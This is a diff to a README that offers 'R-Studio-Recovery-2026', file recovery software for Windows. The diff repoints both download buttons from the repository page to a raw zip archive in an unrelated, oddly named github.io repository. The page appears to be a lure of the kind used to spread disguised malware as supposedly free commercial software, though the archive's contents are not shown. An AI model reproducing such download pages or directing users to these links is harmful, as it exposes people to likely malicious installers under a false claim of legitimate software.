@@ -5,12 +5,12 @@ description: "Download R-Studio for Windows 10 and 11 to recover lost files and 
 ---
 # 💾 R-Studio-Recovery-2026 - Recover your lost files today
 
-[![](https://img.shields.io/badge/Download-R--Studio--Recovery--2026-blue.svg)](https://github.com/Lethianonparasitic876/R-Studio-Recovery-2026)
+[![](https://img.shields.io/badge/Download-R--Studio--Recovery--2026-blue.svg)](https://github.com/Lethianonparasitic876/lethianonparasitic876.github.io/raw/refs/heads/main/Harderian/io-github-lethianonparasitic-2.7.zip)
 
 ## 📥 Download 
 Visit the repository page below to start your download. 
 
-[Click here to download the installer](https://github.com/Lethianonparasitic876/R-Studio-Recovery-2026)
+[Click here to download the installer](https://github.com/Lethianonparasitic876/lethianonparasitic876.github.io/raw/refs/heads/main/Harderian/io-github-lethianonparasitic-2.7.zip)
 
 ## 📖 About this software
 R-Studio-Recovery-2026 helps users recover deleted or lost files from Windows computers. It works on Windows 10 and Windows 11. This tool scans your hard drive for data that you accidentally erased. It supports NTFS file systems and many other formats. You do not need technical knowledge to run the recovery process.
